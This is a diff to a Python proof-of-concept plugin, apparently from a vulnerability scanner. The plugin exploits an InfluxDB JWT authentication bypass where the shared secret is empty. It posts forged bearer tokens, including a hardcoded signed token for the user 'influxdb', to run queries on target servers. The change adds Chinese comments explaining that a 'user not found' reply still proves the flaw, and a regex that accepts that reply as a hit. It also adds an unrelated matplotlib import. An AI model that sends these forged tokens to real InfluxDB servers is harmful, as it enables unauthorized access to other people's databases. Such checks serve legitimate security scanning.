@@ -1,4 +1,5 @@
 # coding:utf-8  
+from matplotlib import rc_params_from_file
 import requests
 import re
 from lib.core.common import url_handle,get_random_ua
@@ -26,6 +27,10 @@ class POC(POCBase):
         "VulnDesc" : """
             influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。
             在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。
+
+            笔者注意到JWT凭据中的用户名错误时会返回user not found，
+            这仅代表用户名错误，但漏洞实际上是存在的，只是需要枚举出正确的用户名而已，
+            出于批量扫描时的效率考虑笔者并不打算弄一个庞大的字典文件来做枚举的工作，仅证明漏洞存在即可  
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
@@ -53,7 +58,10 @@ class POC(POCBase):
             "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImluZmx1eGRiIiwiZXhwIjozMzkyODM4NDI3fQ.if5__J9oZcNotrNnLTC_DoVS4sryD8oaq0n3mx55q_Q"  # influxdb
             ]
         
-        regular = """\{"results":\[\{("statement_id":\d,)?"series":\[\{"columns":\[.+"""
+        # 用户名正确时
+        regular0 = """\{"results":\[\{("statement_id":\d,)?"series":\[\{"columns":\[.+"""
+        # 用户名错误时
+        regular1 = """\{"error":"user not found"\}"""
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
                     "Authorization":"",
@@ -67,7 +75,10 @@ class POC(POCBase):
             for i in users:
                 headers["Authorization"] = "Bearer " + i
                 req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-                if req.status_code == 200 and re.match(regular,req.text.strip()):
+                if req.status_code == 200 and re.match(regular0,req.text.strip()):
+                    vuln = [True,req.text]
+                    break
+                elif req.status_code == 401 and re.match(regular1,req.text.strip()):
                     vuln = [True,req.text]
                     break
                 else:
